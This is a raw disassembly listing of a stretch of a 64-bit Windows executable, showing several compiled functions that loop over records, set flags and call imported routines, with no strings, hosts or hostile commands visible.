   140003b84:	48 8d 0d dd fb 01 00 	lea    0x1fbdd(%rip),%rcx        # 0x140023768
   140003b8b:	e8 f0 e1 ff ff       	call   0x140001d80
   140003b90:	83 c8 ff             	or     $0xffffffff,%eax
   140003b93:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140003b98:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003b9d:	48 83 c4 20          	add    $0x20,%rsp
   140003ba1:	5f                   	pop    %rdi
   140003ba2:	c3                   	ret
   140003ba3:	48 8b cb             	mov    %rbx,%rcx
   140003ba6:	ff 15 3c f0 02 00    	call   *0x2f03c(%rip)        # 0x140032be8
   140003bac:	48 8b cb             	mov    %rbx,%rcx
   140003baf:	48 8b f8             	mov    %rax,%rdi
   140003bb2:	e8 15 72 00 00       	call   0x14000adcc
   140003bb7:	eb 2b                	jmp    0x140003be4
   140003bb9:	48 81 c1 78 30 00 00 	add    $0x3078,%rcx
   140003bc0:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003bc4:	48 ff c2             	inc    %rdx
   140003bc7:	80 3c 11 00          	cmpb   $0x0,(%rcx,%rdx,1)
   140003bcb:	75 f7                	jne    0x140003bc4
   140003bcd:	4c 8d 0d b8 fb 01 00 	lea    0x1fbb8(%rip),%r9        # 0x14002378c
   140003bd4:	4c 8d 05 b9 fb 01 00 	lea    0x1fbb9(%rip),%r8        # 0x140023794
   140003bdb:	ff 15 87 f0 02 00    	call   *0x2f087(%rip)        # 0x140032c68
   140003be1:	48 8b f8             	mov    %rax,%rdi
   140003be4:	48 85 ff             	test   %rdi,%rdi
   140003be7:	75 1f                	jne    0x140003c08
   140003be9:	48 8d 0d b0 fb 01 00 	lea    0x1fbb0(%rip),%rcx        # 0x1400237a0
   140003bf0:	e8 8b e1 ff ff       	call   0x140001d80
   140003bf5:	83 c8 ff             	or     $0xffffffff,%eax
   140003bf8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140003bfd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003c02:	48 83 c4 20          	add    $0x20,%rsp
   140003c06:	5f                   	pop    %rdi
   140003c07:	c3                   	ret
   140003c08:	48 8b d7             	mov    %rdi,%rdx
   140003c0b:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003c10:	48 8d 0d b1 fb 01 00 	lea    0x1fbb1(%rip),%rcx        # 0x1400237c8
   140003c17:	ff 15 1b f0 02 00    	call   *0x2f01b(%rip)        # 0x140032c38
   140003c1d:	48 8d 0d b4 fb 01 00 	lea    0x1fbb4(%rip),%rcx        # 0x1400237d8
   140003c24:	ff 15 8e ef 02 00    	call   *0x2ef8e(%rip)        # 0x140032bb8
   140003c2a:	48 8b c8             	mov    %rax,%rcx
   140003c2d:	ff 15 cd ef 02 00    	call   *0x2efcd(%rip)        # 0x140032c00
   140003c33:	48 8b c8             	mov    %rax,%rcx
   140003c36:	48 8d 15 a3 fb 01 00 	lea    0x1fba3(%rip),%rdx        # 0x1400237e0
   140003c3d:	ff 15 c5 ef 02 00    	call   *0x2efc5(%rip)        # 0x140032c08
   140003c43:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   140003c47:	48 8b e8             	mov    %rax,%rbp
   140003c4a:	48 3b 5e 18          	cmp    0x18(%rsi),%rbx
   140003c4e:	0f 83 df 00 00 00    	jae    0x140003d33
   140003c54:	0f 1f 40 00          	nopl   0x0(%rax)
   140003c58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003c5f:	00 
   140003c60:	0f b6 4b 11          	movzbl 0x11(%rbx),%ecx
   140003c64:	80 e9 4d             	sub    $0x4d,%cl
   140003c67:	f6 c1 df             	test   $0xdf,%cl
   140003c6a:	0f 85 ab 00 00 00    	jne    0x140003d1b
   140003c70:	48 8b d3             	mov    %rbx,%rdx
   140003c73:	48 8b ce             	mov    %rsi,%rcx
   140003c76:	e8 b5 d5 ff ff       	call   0x140001230
   140003c7b:	83 3d 5a d4 03 00 00 	cmpl   $0x0,0x3d45a(%rip)        # 0x1400410dc
   140003c82:	48 8b f8             	mov    %rax,%rdi
   140003c85:	8b 4b 0c             	mov    0xc(%rbx),%ecx
   140003c88:	74 16                	je     0x140003ca0
   140003c8a:	e8 e3 4e 00 00       	call   0x140008b72
   140003c8f:	4c 8d 47 08          	lea    0x8(%rdi),%r8
   140003c93:	48 8d 15 4e fb 01 00 	lea    0x1fb4e(%rip),%rdx        # 0x1400237e8
   140003c9a:	44 8d 48 f8          	lea    -0x8(%rax),%r9d
   140003c9e:	eb 2c                	jmp    0x140003ccc
   140003ca0:	83 3d 6d ee 02 00 25 	cmpl   $0x25,0x2ee6d(%rip)        # 0x140032b14
   140003ca7:	7c 0f                	jl     0x140003cb8
   140003ca9:	e8 c4 4e 00 00       	call   0x140008b72
   140003cae:	4c 8d 47 10          	lea    0x10(%rdi),%r8
   140003cb2:	44 8d 48 f0          	lea    -0x10(%rax),%r9d
   140003cb6:	eb 0d                	jmp    0x140003cc5
   140003cb8:	e8 b5 4e 00 00       	call   0x140008b72
   140003cbd:	4c 8d 47 0c          	lea    0xc(%rdi),%r8
   140003cc1:	44 8d 48 f4          	lea    -0xc(%rax),%r9d
   140003cc5:	48 8d 15 20 fb 01 00 	lea    0x1fb20(%rip),%rdx        # 0x1400237ec
   140003ccc:	48 8b cd             	mov    %rbp,%rcx
   140003ccf:	ff 15 23 ef 02 00    	call   *0x2ef23(%rip)        # 0x140032bf8
   140003cd5:	48 85 c0             	test   %rax,%rax
   140003cd8:	74 12                	je     0x140003cec
   140003cda:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003cde:	48 8b d0             	mov    %rax,%rdx
   140003ce1:	ff 15 c9 ee 02 00    	call   *0x2eec9(%rip)        # 0x140032bb0
   140003ce7:	48 85 c0             	test   %rax,%rax
   140003cea:	75 10                	jne    0x140003cfc
   140003cec:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140003cf0:	48 8d 0d f9 fa 01 00 	lea    0x1faf9(%rip),%rcx        # 0x1400237f0
   140003cf7:	e8 84 e0 ff ff       	call   0x140001d80
   140003cfc:	ff 15 16 ef 02 00    	call   *0x2ef16(%rip)        # 0x140032c18
   140003d02:	48 85 c0             	test   %rax,%rax
   140003d05:	74 0c                	je     0x140003d13
   140003d07:	ff 15 13 ef 02 00    	call   *0x2ef13(%rip)        # 0x140032c20
   140003d0d:	ff 15 fd ee 02 00    	call   *0x2eefd(%rip)        # 0x140032c10
   140003d13:	48 8b cf             	mov    %rdi,%rcx
   140003d16:	e8 b1 70 00 00       	call   0x14000adcc
   140003d1b:	48 8b d3             	mov    %rbx,%rdx
   140003d1e:	48 8b ce             	mov    %rsi,%rcx
   140003d21:	e8 0a d9 ff ff       	call   0x140001630
   140003d26:	48 8b d8             	mov    %rax,%rbx
   140003d29:	48 3b 46 18          	cmp    0x18(%rsi),%rax
   140003d2d:	0f 82 2d ff ff ff    	jb     0x140003c60
   140003d33:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140003d38:	33 c0                	xor    %eax,%eax
   140003d3a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140003d3f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003d44:	48 83 c4 20          	add    $0x20,%rsp
   140003d48:	5f                   	pop    %rdi
   140003d49:	c3                   	ret
   140003d4a:	cc                   	int3
   140003d4b:	cc                   	int3
   140003d4c:	cc                   	int3
   140003d4d:	cc                   	int3
   140003d4e:	cc                   	int3
   140003d4f:	cc                   	int3
   140003d50:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003d55:	57                   	push   %rdi
   140003d56:	48 83 ec 20          	sub    $0x20,%rsp
   140003d5a:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140003d5e:	48 8b f9             	mov    %rcx,%rdi
   140003d61:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   140003d65:	0f 83 40 01 00 00    	jae    0x140003eab
   140003d6b:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140003d70:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140003d75:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140003d7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003d80:	80 7e 11 7a          	cmpb   $0x7a,0x11(%rsi)
   140003d84:	0f 85 fa 00 00 00    	jne    0x140003e84
   140003d8a:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140003d8d:	e8 e0 4d 00 00       	call   0x140008b72
   140003d92:	44 8b f0             	mov    %eax,%r14d
   140003d95:	44 03 77 08          	add    0x8(%rdi),%r14d
   140003d99:	83 3d 3c d3 03 00 00 	cmpl   $0x0,0x3d33c(%rip)        # 0x1400410dc
   140003da0:	74 52                	je     0x140003df4
   140003da2:	48 8d 6f 78          	lea    0x78(%rdi),%rbp
   140003da6:	45 33 c0             	xor    %r8d,%r8d
   140003da9:	48 8b d5             	mov    %rbp,%rdx
   140003dac:	33 c9                	xor    %ecx,%ecx
   140003dae:	e8 ed 1c 00 00       	call   0x140005aa0
   140003db3:	48 8b d8             	mov    %rax,%rbx
   140003db6:	48 85 c0             	test   %rax,%rax
   140003db9:	75 14                	jne    0x140003dcf
   140003dbb:	48 8b d5             	mov    %rbp,%rdx
   140003dbe:	48 8d 0d 43 fa 01 00 	lea    0x1fa43(%rip),%rcx        # 0x140023808
   140003dc5:	e8 b6 df ff ff       	call   0x140001d80
   140003dca:	e9 b5 00 00 00       	jmp    0x140003e84
   140003dcf:	45 8b c6             	mov    %r14d,%r8d
   140003dd2:	48 8d 0d 57 fa 01 00 	lea    0x1fa57(%rip),%rcx        # 0x140023830
   140003dd9:	48 8b d3             	mov    %rbx,%rdx
   140003ddc:	ff 15 6e ee 02 00    	call   *0x2ee6e(%rip)        # 0x140032c50
   140003de2:	4c 8b f0             	mov    %rax,%r14
   140003de5:	48 3b dd             	cmp    %rbp,%rbx
   140003de8:	74 55                	je     0x140003e3f
   140003dea:	48 8b cb             	mov    %rbx,%rcx
   140003ded:	e8 da 6f 00 00       	call   0x14000adcc
   140003df2:	eb 4b                	jmp    0x140003e3f
   140003df4:	48 8d 4f 78          	lea    0x78(%rdi),%rcx
   140003df8:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003dfc:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e00:	48 ff c2             	inc    %rdx
   140003e03:	80 3c 11 00          	cmpb   $0x0,(%rcx,%rdx,1)
   140003e07:	75 f7                	jne    0x140003e00
   140003e09:	4c 8d 0d 7c f9 01 00 	lea    0x1f97c(%rip),%r9        # 0x14002378c
   140003e10:	4c 8d 05 7d f9 01 00 	lea    0x1f97d(%rip),%r8        # 0x140023794
   140003e17:	ff 15 4b ee 02 00    	call   *0x2ee4b(%rip)        # 0x140032c68
   140003e1d:	45 8b c6             	mov    %r14d,%r8d
   140003e20:	48 8d 0d 11 fa 01 00 	lea    0x1fa11(%rip),%rcx        # 0x140023838
   140003e27:	48 8b d0             	mov    %rax,%rdx
   140003e2a:	48 8b d8             	mov    %rax,%rbx
   140003e2d:	ff 15 25 ee 02 00    	call   *0x2ee25(%rip)        # 0x140032c58
   140003e33:	48 8b cb             	mov    %rbx,%rcx
   140003e36:	4c 8b f0             	mov    %rax,%r14
   140003e39:	ff 15 31 ed 02 00    	call   *0x2ed31(%rip)        # 0x140032b70
   140003e3f:	48 8d 0d fa f9 01 00 	lea    0x1f9fa(%rip),%rcx        # 0x140023840
   140003e46:	ff 15 fc ed 02 00    	call   *0x2edfc(%rip)        # 0x140032c48
   140003e4c:	48 85 c0             	test   %rax,%rax
   140003e4f:	75 17                	jne    0x140003e68
   140003e51:	48 8d 0d f0 f9 01 00 	lea    0x1f9f0(%rip),%rcx        # 0x140023848
   140003e58:	e8 23 df ff ff       	call   0x140001d80
   140003e5d:	49 8b ce             	mov    %r14,%rcx
   140003e60:	ff 15 0a ed 02 00    	call   *0x2ed0a(%rip)        # 0x140032b70
   140003e66:	eb 1c                	jmp    0x140003e84
   140003e68:	49 8b d6             	mov    %r14,%rdx
   140003e6b:	48 8b c8             	mov    %rax,%rcx
   140003e6e:	ff 15 64 ed 02 00    	call   *0x2ed64(%rip)        # 0x140032bd8
   140003e74:	85 c0                	test   %eax,%eax
   140003e76:	74 0c                	je     0x140003e84
   140003e78:	48 8d 0d f1 f9 01 00 	lea    0x1f9f1(%rip),%rcx        # 0x140023870
   140003e7f:	e8 fc de ff ff       	call   0x140001d80
   140003e84:	48 8b d6             	mov    %rsi,%rdx
   140003e87:	48 8b cf             	mov    %rdi,%rcx
   140003e8a:	e8 a1 d7 ff ff       	call   0x140001630
   140003e8f:	48 8b f0             	mov    %rax,%rsi
   140003e92:	48 3b 47 18          	cmp    0x18(%rdi),%rax
   140003e96:	0f 82 e4 fe ff ff    	jb     0x140003d80
   140003e9c:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   140003ea1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003ea6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003eab:	33 c0                	xor    %eax,%eax
   140003ead:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003eb2:	48 83 c4 20          	add    $0x20,%rsp
   140003eb6:	5f                   	pop    %rdi
   140003eb7:	c3                   	ret
   140003eb8:	cc                   	int3
   140003eb9:	cc                   	int3
   140003eba:	cc                   	int3
   140003ebb:	cc                   	int3
   140003ebc:	cc                   	int3
   140003ebd:	cc                   	int3
   140003ebe:	cc                   	int3
   140003ebf:	cc                   	int3
   140003ec0:	40 53                	rex push %rbx
   140003ec2:	b8 70 20 00 00       	mov    $0x2070,%eax
   140003ec7:	e8 84 4d 00 00       	call   0x140008c50
   140003ecc:	48 2b e0             	sub    %rax,%rsp
   140003ecf:	48 8b 05 3a e1 02 00 	mov    0x2e13a(%rip),%rax        # 0x140032010
   140003ed6:	48 33 c4             	xor    %rsp,%rax
   140003ed9:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   140003ee0:	00 
   140003ee1:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140003ee6:	48 8b d9             	mov    %rcx,%rbx
   140003ee9:	f7 2d 25 ec 02 00    	imull  0x2ec25(%rip)        # 0x140032b14
   140003eef:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140003ef5:	c1 fa 02             	sar    $0x2,%edx
   140003ef8:	8b c2                	mov    %edx,%eax
   140003efa:	c1 e8 1f             	shr    $0x1f,%eax
   140003efd:	03 d0                	add    %eax,%edx
   140003eff:	33 c0                	xor    %eax,%eax
   140003f01:	83 fa 02             	cmp    $0x2,%edx
   140003f04:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140003f08:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f0d:	0f 94 c0             	sete   %al
   140003f10:	89 05 c6 d1 03 00    	mov    %eax,0x3d1c6(%rip)        # 0x1400410dc
   140003f16:	e8 05 a7 00 00       	call   0x14000e620
   140003f1b:	80 7c 24 5f 00       	cmpb   $0x0,0x5f(%rsp)
   140003f20:	0f 85 91 00 00 00    	jne    0x140003fb7
   140003f26:	83 bb 78 40 00 00 00 	cmpl   $0x0,0x4078(%rbx)
   140003f2d:	74 30                	je     0x140003f5f
   140003f2f:	48 8d 93 78 20 00 00 	lea    0x2078(%rbx),%rdx
   140003f36:	4c 8d 05 13 f6 01 00 	lea    0x1f613(%rip),%r8        # 0x140023550
   140003f3d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003f42:	e8 39 ef ff ff       	call   0x140002e80
   140003f47:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003f4c:	e8 0f ee ff ff       	call   0x140002d60
   140003f51:	85 c0                	test   %eax,%eax
   140003f53:	74 0a                	je     0x140003f5f
   140003f55:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003f5a:	e8 81 12 00 00       	call   0x1400051e0
   140003f5f:	48 8d 93 78 30 00 00 	lea    0x3078(%rbx),%rdx
   140003f66:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140003f6b:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140003f72:	00 
   140003f73:	e8 08 ef ff ff       	call   0x140002e80
   140003f78:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140003f7f:	00 
   140003f80:	e8 5b 12 00 00       	call   0x1400051e0
   140003f85:	48 85 c0             	test   %rax,%rax
   140003f88:	75 1d                	jne    0x140003fa7
   140003f8a:	4c 8d 84 24 60 10 00 	lea    0x1060(%rsp),%r8
   140003f91:	00 
   140003f92:	48 8d 15 c7 f5 01 00 	lea    0x1f5c7(%rip),%rdx        # 0x140023560
   140003f99:	48 8d 0d e0 f5 01 00 	lea    0x1f5e0(%rip),%rcx        # 0x140023580
   140003fa0:	e8 bb db ff ff       	call   0x140001b60
   140003fa5:	eb 1c                	jmp    0x140003fc3
   140003fa7:	8b 15 67 eb 02 00    	mov    0x2eb67(%rip),%edx        # 0x140032b14
   140003fad:	48 8b c8             	mov    %rax,%rcx
   140003fb0:	e8 fb ef ff ff       	call   0x140002fb0
   140003fb5:	eb 0f                	jmp    0x140003fc6
   140003fb7:	48 8d 0d 72 f5 01 00 	lea    0x1f572(%rip),%rcx        # 0x140023530
   140003fbe:	e8 bd dd ff ff       	call   0x140001d80
   140003fc3:	83 c8 ff             	or     $0xffffffff,%eax
   140003fc6:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003fcd:	00 
   140003fce:	48 33 cc             	xor    %rsp,%rcx
   140003fd1:	e8 3a 4c 00 00       	call   0x140008c10
   140003fd6:	48 81 c4 70 20 00 00 	add    $0x2070,%rsp
   140003fdd:	5b                   	pop    %rbx
   140003fde:	c3                   	ret
   140003fdf:	cc                   	int3
   140003fe0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003fe5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003fea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003fef:	57                   	push   %rdi
   140003ff0:	b8 40 20 00 00       	mov    $0x2040,%eax
   140003ff5:	e8 56 4c 00 00       	call   0x140008c50
   140003ffa:	48 2b e0             	sub    %rax,%rsp
   140003ffd:	48 8b 05 0c e0 02 00 	mov    0x2e00c(%rip),%rax        # 0x140032010
   140004004:	48 33 c4             	xor    %rsp,%rax
   140004007:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   14000400e:	00 
   14000400f:	48 8b 05 0a eb 02 00 	mov    0x2eb0a(%rip),%rax        # 0x140032b20
   140004016:	33 ed                	xor    %ebp,%ebp
   140004018:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   14000401c:	48 8b f1             	mov    %rcx,%rsi
   14000401f:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004025:	48 8b 05 ec ea 02 00 	mov    0x2eaec(%rip),%rax        # 0x140032b18
   14000402c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004032:	48 8b 05 0f eb 02 00 	mov    0x2eb0f(%rip),%rax        # 0x140032b48
   140004039:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000403f:	48 8b 05 0a eb 02 00 	mov    0x2eb0a(%rip),%rax        # 0x140032b50
   140004046:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000404c:	48 8b 05 ed ea 02 00 	mov    0x2eaed(%rip),%rax        # 0x140032b40
   140004053:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004059:	48 8b 05 d8 ea 02 00 	mov    0x2ead8(%rip),%rax        # 0x140032b38
   140004060:	89 28                	mov    %ebp,(%rax)
   140004062:	48 3b 59 18          	cmp    0x18(%rcx),%rbx
   140004066:	0f 83 52 01 00 00    	jae    0x1400041be
   14000406c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004070:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140004074:	0f 85 8e 00 00 00    	jne    0x140004108
   14000407a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004080:	48 8d 15 05 f5 01 00 	lea    0x1f505(%rip),%rdx        # 0x14002358c
   140004087:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   14000408b:	e8 70 69 00 00       	call   0x14000aa00
   140004090:	85 c0                	test   %eax,%eax
   140004092:	74 74                	je     0x140004108
   140004094:	0f be 43 12          	movsbl 0x12(%rbx),%eax
   140004098:	83 e8 4f             	sub    $0x4f,%eax
   14000409b:	74 5e                	je     0x1400040fb
   14000409d:	83 e8 08             	sub    $0x8,%eax
   1400040a0:	74 1a                	je     0x1400040bc
   1400040a2:	83 e8 1e             	sub    $0x1e,%eax
   1400040a5:	74 0e                	je     0x1400040b5
   1400040a7:	83 f8 01             	cmp    $0x1,%eax
   1400040aa:	75 5c                	jne    0x140004108
   1400040ac:	48 8b 05 85 ea 02 00 	mov    0x2ea85(%rip),%rax        # 0x140032b38
   1400040b3:	eb 4d                	jmp    0x140004102
   1400040b5:	bd 01 00 00 00       	mov    $0x1,%ebp
   1400040ba:	eb 4c                	jmp    0x140004108
   1400040bc:	83 3d 19 d0 03 00 00 	cmpl   $0x0,0x3d019(%rip)        # 0x1400410dc
   1400040c3:	74 0b                	je     0x1400040d0
   1400040c5:	48 8d 4b 14          	lea    0x14(%rbx),%rcx
   1400040c9:	e8 12 fa ff ff       	call   0x140003ae0
   1400040ce:	eb 38                	jmp    0x140004108
   1400040d0:	48 8d 53 14          	lea    0x14(%rbx),%rdx
   1400040d4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400040da:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400040df:	e8 b8 b6 00 00       	call   0x14000f79c
   1400040e4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400040e8:	0f 84 fb 00 00 00    	je     0x1400041e9
   1400040ee:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400040f3:	ff 15 2f eb 02 00    	call   *0x2eb2f(%rip)        # 0x140032c28
   1400040f9:	eb 0d                	jmp    0x140004108
   1400040fb:	48 8b 05 26 ea 02 00 	mov    0x2ea26(%rip),%rax        # 0x140032b28
   140004102:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004108:	48 8b d3             	mov    %rbx,%rdx
   14000410b:	48 8b ce             	mov    %rsi,%rcx
   14000410e:	e8 1d d5 ff ff       	call   0x140001630
   140004113:	48 8b d8             	mov    %rax,%rbx
   140004116:	48 3b 46 18          	cmp    0x18(%rsi),%rax
   14000411a:	0f 82 50 ff ff ff    	jb     0x140004070
   140004120:	85 ed                	test   %ebp,%ebp
   140004122:	0f 84 96 00 00 00    	je     0x1400041be
   140004128:	33 c9                	xor    %ecx,%ecx
   14000412a:	e8 81 7c 00 00       	call   0x14000bdb0
   14000412f:	48 8b c8             	mov    %rax,%rcx
   140004132:	e8 c1 ba 00 00       	call   0x14000fbf8
   140004137:	8b c8                	mov    %eax,%ecx
   140004139:	ba 00 80 00 00       	mov    $0x8000,%edx
   14000413e:	e8 e5 b6 00 00       	call   0x14000f828
   140004143:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004148:	e8 63 7c 00 00       	call   0x14000bdb0
   14000414d:	48 8b c8             	mov    %rax,%rcx
   140004150:	e8 a3 ba 00 00       	call   0x14000fbf8
   140004155:	8b c8                	mov    %eax,%ecx
   140004157:	ba 00 80 00 00       	mov    $0x8000,%edx
   14000415c:	e8 c7 b6 00 00       	call   0x14000f828
   140004161:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004166:	e8 45 7c 00 00       	call   0x14000bdb0
   14000416b:	48 8b c8             	mov    %rax,%rcx
   14000416e:	e8 41 ba 00 00       	call   0x14000fbb4
   140004173:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004178:	e8 33 7c 00 00       	call   0x14000bdb0
   14000417d:	48 8b c8             	mov    %rax,%rcx
   140004180:	e8 2f ba 00 00       	call   0x14000fbb4
   140004185:	33 c9                	xor    %ecx,%ecx
   140004187:	e8 24 7c 00 00       	call   0x14000bdb0
   14000418c:	48 8b c8             	mov    %rax,%rcx
   14000418f:	33 d2                	xor    %edx,%edx
   140004191:	e8 36 ae 00 00       	call   0x14000efcc
   140004196:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000419b:	e8 10 7c 00 00       	call   0x14000bdb0
   1400041a0:	48 8b c8             	mov    %rax,%rcx
   1400041a3:	33 d2                	xor    %edx,%edx
   1400041a5:	e8 22 ae 00 00       	call   0x14000efcc
   1400041aa:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400041af:	e8 fc 7b 00 00       	call   0x14000bdb0
   1400041b4:	48 8b c8             	mov    %rax,%rcx
   1400041b7:	33 d2                	xor    %edx,%edx
   1400041b9:	e8 0e ae 00 00       	call   0x14000efcc
   1400041be:	33 c0                	xor    %eax,%eax
   1400041c0:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400041c7:	00 
   1400041c8:	48 33 cc             	xor    %rsp,%rcx
   1400041cb:	e8 40 4a 00 00       	call   0x140008c10
   1400041d0:	4c 8d 9c 24 40 20 00 	lea    0x2040(%rsp),%r11
   1400041d7:	00 
   1400041d8:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400041dc:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   1400041e0:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400041e4:	49 8b e3             	mov    %r11,%rsp
   1400041e7:	5f                   	pop    %rdi
   1400041e8:	c3                   	ret
   1400041e9:	48 8d 53 14          	lea    0x14(%rbx),%rdx
   1400041ed:	48 8d 0d ac f3 01 00 	lea    0x1f3ac(%rip),%rcx        # 0x1400235a0
   1400041f4:	e8 87 db ff ff       	call   0x140001d80
   1400041f9:	83 c8 ff             	or     $0xffffffff,%eax
   1400041fc:	eb c2                	jmp    0x1400041c0
   1400041fe:	cc                   	int3
   1400041ff:	cc                   	int3
   140004200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004205:	57                   	push   %rdi
   140004206:	48 83 ec 20          	sub    $0x20,%rsp
   14000420a:	83 3d cb ce 03 00 00 	cmpl   $0x0,0x3cecb(%rip)        # 0x1400410dc
   140004211:	48 8b d9             	mov    %rcx,%rbx
   140004214:	48 8b 91 88 40 00 00 	mov    0x4088(%rcx),%rdx
   14000421b:	8b 89 80 40 00 00    	mov    0x4080(%rcx),%ecx
   140004221:	74 4d                	je     0x140004270
   140004223:	e8 e8 13 00 00       	call   0x140005610
   140004228:	48 8b f8             	mov    %rax,%rdi
   14000422b:	48 85 c0             	test   %rax,%rax
   14000422e:	74 26                	je     0x140004256
   140004230:	8b 8b 80 40 00 00    	mov    0x4080(%rbx),%ecx
   140004236:	45 33 c0             	xor    %r8d,%r8d
   140004239:	48 8b d0             	mov    %rax,%rdx
   14000423c:	e8 af f8 ff ff       	call   0x140003af0
   140004241:	48 8b cf             	mov    %rdi,%rcx
   140004244:	e8 83 6b 00 00       	call   0x14000adcc
   140004249:	33 c0                	xor    %eax,%eax
   14000424b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004250:	48 83 c4 20          	add    $0x20,%rsp
   140004254:	5f                   	pop    %rdi
   140004255:	c3                   	ret
   140004256:	48 8d 0d 8b f3 01 00 	lea    0x1f38b(%rip),%rcx        # 0x1400235e8
   14000425d:	e8 1e db ff ff       	call   0x140001d80
   140004262:	83 c8 ff             	or     $0xffffffff,%eax
   140004265:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000426a:	48 83 c4 20          	add    $0x20,%rsp
   14000426e:	5f                   	pop    %rdi
   14000426f:	c3                   	ret
   140004270:	e8 eb 19 00 00       	call   0x140005c60
   140004275:	48 8b f8             	mov    %rax,%rdi
   140004278:	48 85 c0             	test   %rax,%rax
   14000427b:	74 4a                	je     0x1400042c7
   14000427d:	8b 8b 80 40 00 00    	mov    0x4080(%rbx),%ecx
   140004283:	45 33 c0             	xor    %r8d,%r8d
   140004286:	48 8b d0             	mov    %rax,%rdx
   140004289:	ff 15 11 e9 02 00    	call   *0x2e911(%rip)        # 0x140032ba0
   14000428f:	48 8b 0f             	mov    (%rdi),%rcx
   140004292:	48 8b df             	mov    %rdi,%rbx
   140004295:	48 85 c9             	test   %rcx,%rcx
   140004298:	74 18                	je     0x1400042b2
   14000429a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400042a0:	e8 27 6b 00 00       	call   0x14000adcc
   1400042a5:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400042a9:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   1400042ad:	48 85 c9             	test   %rcx,%rcx
   1400042b0:	75 ee                	jne    0x1400042a0
   1400042b2:	48 8b cf             	mov    %rdi,%rcx
   1400042b5:	e8 12 6b 00 00       	call   0x14000adcc
   1400042ba:	33 c0                	xor    %eax,%eax
   1400042bc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400042c1:	48 83 c4 20          	add    $0x20,%rsp
   1400042c5:	5f                   	pop    %rdi
   1400042c6:	c3                   	ret
   1400042c7:	48 8d 0d 3a f3 01 00 	lea    0x1f33a(%rip),%rcx        # 0x140023608
   1400042ce:	e8 ad da ff ff       	call   0x140001d80
   1400042d3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400042d8:	83 c8 ff             	or     $0xffffffff,%eax
   1400042db:	48 83 c4 20          	add    $0x20,%rsp
   1400042df:	5f                   	pop    %rdi
   1400042e0:	c3                   	ret
   1400042e1:	cc                   	int3
   1400042e2:	cc                   	int3
